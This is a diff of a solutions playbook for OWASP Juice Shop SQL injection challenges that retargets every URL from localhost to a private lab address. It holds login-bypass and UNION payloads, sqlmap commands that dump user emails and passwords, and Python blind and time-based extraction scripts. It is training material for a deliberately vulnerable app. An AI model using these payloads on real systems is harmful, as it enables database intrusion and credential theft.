@@ -12,7 +12,7 @@ This playbook summarizes the main challenge categories and solutions for OWASP J
 
 **Steps:**
 
-1. Navigate to `http://localhost:3000/#/login`
+1. Navigate to `http://10.30.0.237:3000/#/login`
 2. In the email field, enter: `admin@juice-sh.op' OR 1=1--`
 3. In the password field, enter any value (e.g., `password`)
 4. Click "Log in"
@@ -21,7 +21,7 @@ This playbook summarizes the main challenge categories and solutions for OWASP J
 **Manual Command:**
 
 ```zsh
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}'
 ```
@@ -29,7 +29,7 @@ curl -X POST "http://localhost:3000/rest/user/login" \
 **SQLMap Command (Fixed):**
 
 ```zsh
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"admin@juice-sh.op","password":"password"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --technique=BEU --level=3 --risk=3 \
@@ -50,13 +50,13 @@ sqlmap -u "http://localhost:3000/rest/user/login" \
 **Manual Command:**
 
 ```zsh
-curl "http://localhost:3000/rest/products/search?q=apple%27%20UNION%20SELECT%20null,email,password,null,null,null,null,null,null%20FROM%20Users--"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20UNION%20SELECT%20null,email,password,null,null,null,null,null,null%20FROM%20Users--"
 ```
 
 **SQLMap Command:**
 
 ```zsh
-sqlmap -u "http://localhost:3000/rest/products/search?q=apple" \
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
   --dbms=sqlite --technique=U --level=3 --risk=3 \
   --tables --batch
 ```
@@ -67,7 +67,7 @@ sqlmap -u "http://localhost:3000/rest/products/search?q=apple" \
 
 **Steps:**
 
-1. Go to `http://localhost:3000/#/track-result`
+1. Go to `http://10.30.0.237:3000/#/track-result`
 2. In the tracking ID field, enter: `1' OR '1'='1`
 3. Click "Track"
 4. Observe all orders being displayed
@@ -75,7 +75,7 @@ sqlmap -u "http://localhost:3000/rest/products/search?q=apple" \
 **Manual Command:**
 
 ```zsh
-curl -X GET "http://localhost:3000/rest/track-order/1%27%20OR%20%271%27=%271" \
+curl -X GET "http://10.30.0.237:3000/rest/track-order/1%27%20OR%20%271%27=%271" \
   -H "Accept: application/json"
 ```
 
@@ -128,7 +128,7 @@ def blind_sqli_extract(url, payload_template):
     return result
 
 # Usage example
-url = "http://localhost:3000/rest/products/search"
+url = "http://10.30.0.237:3000/rest/products/search"
 payload = "apple' AND (SELECT SUBSTR(email,{position},1) FROM Users WHERE id=1)='{char}'--"
 extracted_email = blind_sqli_extract(url, payload)
 print(f"Extracted email: {extracted_email}")
@@ -150,7 +150,7 @@ print(f"Extracted email: {extracted_email}")
 ```zsh
 # Test time-based injection (SQLite doesn't have SLEEP, use heavy query)
 curl -w "Time: %{time_total}s\n" \
-  "http://localhost:3000/rest/products/search?q=apple%27%3B%20SELECT%20COUNT%28%2A%29%20FROM%20sqlite_master%20WHERE%20tbl_name%20LIKE%20%27%25%27--"
+  "http://10.30.0.237:3000/rest/products/search?q=apple%27%3B%20SELECT%20COUNT%28%2A%29%20FROM%20sqlite_master%20WHERE%20tbl_name%20LIKE%20%27%25%27--"
 ```
 
 **Time-Based Extraction Script:**
@@ -188,7 +188,7 @@ def time_based_sqli(url, true_payload, false_payload):
     return False
 
 # Usage
-url = "http://localhost:3000/rest/products/search"
+url = "http://10.30.0.237:3000/rest/products/search"
 true_payload = "apple'; SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE '%'--"
 false_payload = "apple'; SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE 'nonexistent'--"
 time_based_sqli(url, true_payload, false_payload)
@@ -208,7 +208,7 @@ time_based_sqli(url, true_payload, false_payload)
 **Registration Command:**
 
 ```zsh
-curl -X POST "http://localhost:3000/api/Users/" \
+curl -X POST "http://10.30.0.237:3000/api/Users/" \
   -H "Content-Type: application/json" \
   -d '{
     "email": "test'\''INSERT INTO Users (email,password) VALUES ('\''hacker@test.com'\'','\''password'\'')--@test.com",
@@ -234,10 +234,10 @@ curl -X POST "http://localhost:3000/api/Users/" \
 
 ```zsh
 # Test for SQL errors
-curl "http://localhost:3000/rest/products/search?q=apple%27%20AND%20%281%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%29%29--"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20AND%20%281%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%29%29--"
 
 # SQLite specific error injection
-curl "http://localhost:3000/rest/products/search?q=apple%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201/0%20ELSE%201%20END%29--"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201/0%20ELSE%201%20END%29--"
 ```
 
 ### Complete SQLMap Automation Guide
@@ -246,19 +246,19 @@ curl "http://localhost:3000/rest/products/search?q=apple%27%20AND%20%28SELECT%20
 
 ```zsh
 # Enumerate databases
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"test@test.com","password":"test123"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --dbs --batch
 
 # Enumerate tables
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"test@test.com","password":"test123"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --tables --batch
 
 # Enumerate columns for Users table
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"test@test.com","password":"test123"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite -T Users --columns --batch
@@ -268,13 +268,13 @@ sqlmap -u "http://localhost:3000/rest/user/login" \
 
 ```zsh
 # Dump all Users table data
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"test@test.com","password":"test123"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite -T Users --dump --batch
 
 # Dump specific columns
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"test@test.com","password":"test123"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite -T Users -C email,password --dump --batch
@@ -284,12 +284,12 @@ sqlmap -u "http://localhost:3000/rest/user/login" \
 
 ```zsh
 # Test all parameters with maximum detection
-sqlmap -u "http://localhost:3000/rest/products/search?q=test" \
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
   --dbms=sqlite --level=5 --risk=3 \
   --technique=BEUSTQ --batch --threads=4
 
 # Test POST data with custom injection points
-sqlmap -u "http://localhost:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --data='{"email":"test@test.com*","password":"test123*"}' \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --batch --tamper=space2comment
@@ -307,7 +307,7 @@ import json
 import time
 
 class JuiceShopSQLTester:
-    def __init__(self, base_url="http://localhost:3000"):
+    def __init__(self, base_url="http://10.30.0.237:3000"):
         self.base_url = base_url
         self.targets = [
             {
